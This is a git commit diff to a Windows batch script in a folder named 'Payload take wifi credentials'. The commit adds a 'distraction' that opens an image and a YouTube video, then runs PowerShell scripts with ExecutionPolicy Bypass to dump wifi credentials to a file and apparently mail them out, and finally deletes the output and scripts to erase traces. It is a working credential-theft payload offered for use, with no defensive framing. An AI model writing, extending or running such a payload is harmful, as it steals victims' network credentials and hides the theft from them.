0ec22e9d8fb59dd94059d0a85b599d5494aff812
RevoVog <vihanga.vog@gmail.com>
2025-09-03 02:39:16 +0530

    Ending for Now

--- Payload take wifi credentials/run.cmd
+++ Payload take wifi credentials/run.cmd
@@ -1,8 +1,15 @@
 @echo off
+start https://images2.fanpop.com/image/photos/8900000/anime-girl-anime-girls-8951100-1800-2560.jpg
+TIMEOUT /T 1 /NOBREAK > NUL
+start https://www.youtube.com/watch?v=m3w1mUXtCj0
+@REM distraction part ends here
+
 powershell.exe -ExecutionPolicy Bypass -File "wifi.ps1" > output.txt
 TIMEOUT /T 5 /NOBREAK > NUL
 powershell.exe -ExecutionPolicy Bypass -File "mail.ps1"
-TIMEOUT /T 5 /NOBREAK > NUL
+TIMEOUT /T 3 /NOBREAK > NUL
+
+@REM  Delete all traces and self-delete
 del output.txt
 del wifi.ps1
 del mail.ps1
